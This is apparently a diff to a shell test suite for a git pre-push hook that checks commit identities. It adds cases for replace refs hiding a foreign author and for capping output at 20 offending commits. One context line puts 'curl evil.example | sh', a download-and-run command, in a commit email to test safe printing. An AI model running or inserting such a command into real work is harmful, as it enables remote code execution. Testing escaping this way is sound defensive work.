@@ -366,6 +366,9 @@ git -C "$other" commit -q --allow-empty -m other 2>"$work/err" \
   || fail "fixture: other commit refused: $(err)"
 git -C "$other" push -q origin main 2>"$work/err" || fail "fixture: other push: $(err)"
 # r has never fetched other's commit, so the remote oid on stdin is unknown here.
+if git -C "$r" cat-file -e "$(git -C "$other" rev-parse HEAD)" 2>/dev/null; then
+  fail "fixture: r already holds other's commit, so the missing-oid case is vacuous"
+fi
 git -C "$r" push -q --force origin main 2>"$work/err" \
   || fail "pre-push: a missing remote oid must pass: $(err)"
 git -C "$r" remote add fork "$work/fork.git"; git init -q --bare "$work/fork.git"
@@ -428,6 +431,37 @@ want="$want \x27curl evil.example | sh', not the effective 'g@x'"
 grep -qxF "$want" "$work/err" \
   || fail "a quote in a commit email must print as \\x27: $(err)"
 ok "a single quote in a pushed commit's email prints as \\x27"
+
+# A replace ref changes what rev-list reads, not what the push sends: a
+# foreign commit hidden behind a clean replacement is still refused.
+git -C "$r" checkout -q -b replaced main
+GIT_AUTHOR_EMAIL=bad@x try_commit "$r" || fail "fixture: the bad@x commit was refused: $(err)"
+hidden="$(git -C "$r" rev-parse HEAD)"
+clean="$(git -C "$r" commit-tree -p "$hidden^" -m m "$hidden^{tree}")"
+git -C "$r" replace "$hidden" "$clean"
+[ "$(git -C "$r" log -1 --format=%ae "$hidden")" = g@x ] \
+  || fail "fixture: the replace ref does not hide the bad@x author"
+if git -C "$r" push -q origin replaced 2>"$work/err"; then
+  fail "pre-push must refuse a foreign commit hidden behind a replace ref"
+fi
+grep -qF "refusing: commit $hidden has author email 'bad@x'" "$work/err" \
+  || fail "the refusal must name the original commit and its email: $(err)"
+git -C "$r" replace -d "$hidden" >/dev/null
+ok "a replace ref cannot hide a pushed commit's identity"
+
+# Many offending commits: the first 20 are named, then one line counts the
+# rest, so a long rebase does not flood the terminal.
+git -C "$r" checkout -q -b many main
+for _ in $(seq 25); do
+  GIT_COMMITTER_EMAIL=co@x try_commit "$r" || fail "fixture: commit refused: $(err)"
+done
+if git -C "$r" push -q origin many 2>"$work/err"; then
+  fail "pre-push must refuse 25 foreign commits"
+fi
+[ "$(grep -c '^commit-identity: pre-push: refusing: commit ' "$work/err")" -eq 20 ] \
+  && grep -qxF "commit-identity: pre-push: refusing: and 5 more commits whose email differs" "$work/err" \
+  || fail "20 commit lines, then one line counting the other 5: $(err)"
+ok "pre-push names the first 20 offending commits and counts the rest"
 
 # A commit already on a remote passes, whoever made it, and so does a merge
 # of it; a merge commit made under another identity is refused.
